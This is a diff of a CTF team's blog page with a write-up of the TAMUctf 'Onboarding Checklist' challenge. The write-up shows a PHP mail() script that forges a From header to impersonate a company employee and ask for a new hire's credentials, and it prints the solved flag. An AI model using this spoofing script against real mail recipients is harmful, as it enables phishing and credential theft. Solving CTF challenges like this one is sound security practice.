@@ -16,20 +16,18 @@
   <meta http-equiv="window-target" content="_top">
   
   <title>[MISC] TAMUctf - Onboarding Checklist | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="Onboarding Checklist465   Description:From: importantperson@somebigcorp.comDate: Feb 22, 2019 9:00 AMTo: someguy@somebigcorp.comSubject: New Employee Access Hello Some Guy,We need to begin sending re">
+  <meta name="description" content="Onboarding Checklist 465   Description: From: importantperson@somebigcorp.com Date: Feb 22, 2019 9:00 AM To: someguy@somebigcorp.com Subject: New Employee Access Hello Some Guy, We need to begin send">
 <meta name="keywords" content="mailSpoofing">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[MISC] TAMUctf - Onboarding Checklist">
 <meta property="og:url" content="https://teamrocketist.github.io/2019/03/04/MISC-TAMUctf-Onboarding-Checklist/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="Onboarding Checklist465   Description:From: importantperson@somebigcorp.comDate: Feb 22, 2019 9:00 AMTo: someguy@somebigcorp.comSubject: New Employee Access Hello Some Guy,We need to begin sending re">
+<meta property="og:description" content="Onboarding Checklist 465   Description: From: importantperson@somebigcorp.com Date: Feb 22, 2019 9:00 AM To: someguy@somebigcorp.com Subject: New Employee Access Hello Some Guy, We need to begin send">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://i.imgur.com/TDBkzNW.png] " flag"="720x"">
 <meta property="og:updated_time" content="2019-03-04T11:26:38.922Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[MISC] TAMUctf - Onboarding Checklist">
-<meta name="twitter:description" content="Onboarding Checklist465   Description:From: importantperson@somebigcorp.comDate: Feb 22, 2019 9:00 AMTo: someguy@somebigcorp.comSubject: New Employee Access Hello Some Guy,We need to begin sending re">
-<meta name="twitter:image" content="https://i.imgur.com/TDBkzNW.png] " flag"="720x"">
+<meta name="twitter:description" content="Onboarding Checklist 465   Description: From: importantperson@somebigcorp.com Date: Feb 22, 2019 9:00 AM To: someguy@somebigcorp.com Subject: New Employee Access Hello Some Guy, We need to begin send">
   
     <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
   
@@ -369,7 +367,7 @@
         
 		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 447 (words)</span>
+		<span class="post-wordcount hidden-xs">Word Count: 457 (words)</span>
 	
 	
 		<span class="post-readcount hidden-xs">Read Time: 3 (min)</span>
@@ -380,32 +378,43 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p><strong>Onboarding Checklist</strong><br><em>465</em></p>
+<p><strong>Onboarding Checklist</strong><br>
+<em>465</em></p>
 </blockquote>
 <blockquote>
-<p><strong>Description:</strong><br>From: <a href="mailto:importantperson@somebigcorp.com" target="_blank" rel="noopener">importantperson@somebigcorp.com</a><br>Date: Feb 22, 2019 9:00 AM<br>To: <a href="mailto:someguy@somebigcorp.com" target="_blank" rel="noopener">someguy@somebigcorp.com</a><br>Subject: New Employee Access</p>
-<p>Hello Some Guy,<br>We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee’s email address to <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a> so they can process the account request?<br>Thank you,<br>Important Person</p>
+<p><strong>Description:</strong><br>
+From: <a href="mailto:importantperson@somebigcorp.com" target="_blank" rel="noopener">importantperson@somebigcorp.com</a><br>
+Date: Feb 22, 2019 9:00 AM<br>
+To: <a href="mailto:someguy@somebigcorp.com" target="_blank" rel="noopener">someguy@somebigcorp.com</a><br>
+Subject: New Employee Access</p>
+<p>Hello Some Guy,<br>
+We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee’s email address to <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a> so they can process the account request?<br>
+Thank you,<br>
+Important Person</p>
 <p>The new employee can be a little slow to respond.</p>
 <p>Difficulty: easy</p>
 <p>2/26 8:42 am CST: Visting  <code>somebigcorp.com</code>  is not part of the challenge</p>
 </blockquote>
 <p>The goal of this challenge is clear. Send an email to <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a> requesting the credentials for the new employee. Although … we need to be disguised as <a href="mailto:someguy@somebigcorp.com" target="_blank" rel="noopener">someguy@somebigcorp.com</a> in order to request the credentials. How?</p>
-<p><strong>*Email spoofing</strong> is the forgery of an email header so that the message appears to have originated from someone or somewhere other than the actual source.*</p>
+<p><em><strong>Email spoofing</strong> is the forgery of an email header so that the message appears to have originated from someone or somewhere other than the actual source.</em></p>
 <p>To use this technique there is a perfect PHP function called mail(). All we need is a PHP server and an email server (check it up how to setup one on google if you don’t know how to do it)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mail ( string  $to , string  $subject , string  $message [, [mixed] $additional_headers [, string  $</span><br><span class="line">    additional_parameters ]] ) : bool</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>The most important parameters in this case are: <em>From</em> and <em>Reply-To</em> in the additional headers section.  In the <em>From</em> argument we put the email we want to spoof and in the <em>Reply-To</em> we chose the email where we want the people that we fooled to send the replies, in this case we want to fool <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a>. </p>
+<p>The most important parameters in this case are: <em>From</em> and <em>Reply-To</em> in the additional headers section.  In the <em>From</em> argument we put the email we want to spoof and in the <em>Reply-To</em> we chose the email where we want the people that we fooled to send the replies, in this case we want to fool <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a>.</p>
 <p>So to retrieve the flag all we need is:</p>
 <ul>
 <li>PHP Server</li>
 <li>Email Server</li>
 <li>An email where we can receive the credentials (let’s call it <a href="mailto:examplemail@10minutemail.com" target="_blank" rel="noopener">examplemail@10minutemail.com</a>)</li>
 <li>Call the PHP mail() function from the server.</li>
-<li>Put the email where we want to receive the info into the body of the mail()’s message</li>
+<li>Put the email where we want to receive the info into the body of the mail()'s message</li>
 </ul>
-<p>Let’s create the file <em>imnotspoofing.php</em> with the following content<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$to= <span class="string">'tamuctf@gmail.com'</span>;</span><br><span class="line">$subject = <span class="string">'Requesting new employee credentials'</span>;</span><br><span class="line">$message= <span class="string">'Hello. I am request the new employee credentials. Can you send them to my email examplemail@10minutemail.com. Thanks'</span></span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'From: someguy@somebigcorp.com'</span>,</span><br><span class="line">            <span class="string">'Reply-To:  examplemail@10minutemail.com'</span>,</span><br><span class="line">            <span class="string">'X_Mailer: PHP/'</span> . phpversion()</span><br><span class="line">            );</span><br><span class="line">mail($to, $subject, $message, implode(<span class="string">"\n"</span>, $headers));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>Let’s create the file <em>imnotspoofing.php</em> with the following content</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$to= <span class="string">'tamuctf@gmail.com'</span>;</span><br><span class="line">$subject = <span class="string">'Requesting new employee credentials'</span>;</span><br><span class="line">$message= <span class="string">'Hello. I am request the new employee credentials. Can you send them to my email examplemail@10minutemail.com. Thanks'</span></span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'From: someguy@somebigcorp.com'</span>,</span><br><span class="line">            <span class="string">'Reply-To:  examplemail@10minutemail.com'</span>,</span><br><span class="line">            <span class="string">'X_Mailer: PHP/'</span> . phpversion()</span><br><span class="line">            );</span><br><span class="line">mail($to, $subject, $message, implode(<span class="string">"\n"</span>, $headers));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>Shortly after we running this PHP snippet from our server, we’ll receive an email in our <a href="mailto:examplemail@10minutemail.com" target="_blank" rel="noopener">examplemail@10minutemail.com</a> with the flag:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/TDBkzNW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/TDBkzNW.png] &quot;flag&quot; =720x" alt="alt text"><br></a><br> <strong>FLAG:</strong> gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}</p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+<a data-fancybox="gallery" href="https://i.imgur.com/TDBkzNW.png" target="_blank" rel="noopener">
+![alt text](https://i.imgur.com/TDBkzNW.png] "flag" =720x)
+</a>
+ **FLAG:** gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
       
     </div>
     <footer class="article-footer">
